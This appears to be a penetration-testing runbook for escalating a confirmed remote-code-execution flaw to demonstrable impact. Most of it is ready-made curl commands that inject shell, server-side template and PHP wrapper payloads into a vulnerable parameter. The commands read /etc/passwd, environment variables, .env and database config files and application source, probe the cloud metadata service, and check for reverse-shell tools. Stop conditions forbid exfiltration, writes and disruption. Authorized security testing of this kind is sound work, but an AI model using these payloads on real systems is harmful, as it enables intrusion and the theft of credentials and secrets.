# RCE Impact Escalation Runbook

## Purpose
Escalate from "code can run" to demonstrable business impact. SAFE commands only — no destructive actions, no data exfiltration to external services.

## Variables
- `$TARGET_URL` — confirmed vulnerable endpoint
- `$VULN_PARAM` — confirmed injectable parameter
- `$OUTDIR` — output directory
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/rce`

## Impact Categories

### I1 — Server Access Confirmation
Demonstrate ability to read files on server:
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=;cat /etc/hostname" -o "$EVIDENCE_DIR/impact-hostname.txt"
curl -sk "$TARGET_URL?$VULN_PARAM=;cat /etc/passwd|head -5" -o "$EVIDENCE_DIR/impact-passwd.txt"
curl -sk "$TARGET_URL?$VULN_PARAM=;cat /proc/1/cgroup" -o "$EVIDENCE_DIR/impact-cgroup.txt"
```

### I2 — Internal Network Access
Demonstrate ability to reach internal-only services:
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=;curl -s http://169.254.169.254/latest/meta-data/ 2>&1|head -5" -o "$EVIDENCE_DIR/impact-aws-metadata.txt"
curl -sk "$TARGET_URL?$VULN_PARAM=;curl -s http://localhost:8080 2>&1|head -5" -o "$EVIDENCE_DIR/impact-localhost-scan.txt"
curl -sk "$TARGET_URL?$VULN_PARAM=;ifconfig" -o "$EVIDENCE_DIR/impact-ifconfig.txt"
```

### I3 — Source Code Exposure
Demonstrate ability to read application source code:
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=;cat /var/www/html/index.php|head -20" -o "$EVIDENCE_DIR/impact-source-index.txt"
curl -sk "$TARGET_URL?$VULN_PARAM=;find /var/www/html -name *.env 2>/dev/null|xargs cat|head -20" -o "$EVIDENCE_DIR/impact-env-files.txt"
curl -sk "$TARGET_URL?$VULN_PARAM=;cat /app/config/database.yml 2>/dev/null|head -20" -o "$EVIDENCE_DIR/impact-db-config.txt"
```

### I4 — Environment Information
Demonstrate knowledge of the deployment environment:
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=;env|head -30" -o "$EVIDENCE_DIR/impact-env.txt"
curl -sk "$TARGET_URL?$VULN_PARAM=;which python python3 node php java ruby 2>/dev/null" -o "$EVIDENCE_DIR/impact-runtimes.txt"
curl -sk "$TARGET_URL?$VULN_PARAM=;ps aux|head -15" -o "$EVIDENCE_DIR/impact-processes.txt"
```

### I5 — Reverse Shell Capability (NO ACTUAL CONNECTION)
Demonstrate ability to establish outbound connections:
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=;which nc bash python3 2>/dev/null" -o "$EVIDENCE_DIR/impact-revshell-tools.txt"
```

## For SSTI — Impact Escalation
```bash
curl -sk "$TARGET_URL?$VULN_PARAM={{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/hostname').read()}}" -o "$EVIDENCE_DIR/impact-ssti-hostname.txt"
curl -sk "$TARGET_URL?$VULN_PARAM={{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}" -o "$EVIDENCE_DIR/impact-ssti-passwd.txt"
curl -sk "$TARGET_URL?$VULN_PARAM={{self.__init__.__globals__.__builtins__.__import__('os').popen('env').read()}}" -o "$EVIDENCE_DIR/impact-ssti-env.txt"
```

## For LFI -> RCE — Impact Escalation
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=data://text/plain;base64,$(echo -n "<?php system('cat /etc/hostname'); ?>" | base64)" -o "$EVIDENCE_DIR/impact-lfi-rce-hostname.txt"
```

## What Impact Looks Like Per Sub-Type

| Sub-Type | Impact Signal | Severity |
|---|---|---|
| Command Injection | `/etc/passwd` contents visible, env vars exposed | Critical |
| SSTI | Arbitrary Python/Ruby/Java code executed, env accessible | Critical |
| LFI -> RCE | PHP code executed via wrappers, full server access | Critical |
| Deserialization | Object instantiated serverside, RCE chain possible | Critical |
| Log Poisoning | PHP payload executed after log inclusion | Critical |

## Stop Conditions
- Stop escalating once SERVER ACCESS is confirmed — reading `/etc/passwd` or equivalent is sufficient
- Do NOT attempt: data exfiltration to external services, writing files, modifying databases, disrupting services
- If outbound connectivity is blocked, document that limitation

## Evidence for Report
- Output showing server hostname
- Output showing readable system files
- Output showing environment variables (redact secrets before screenshot)
- Output demonstrating internal network access

## Next Routing
- Impact demonstrated -> `runbooks/05-evidence-collection.md`
- Impact limited (no file read, no network access) -> document findings with limited severity
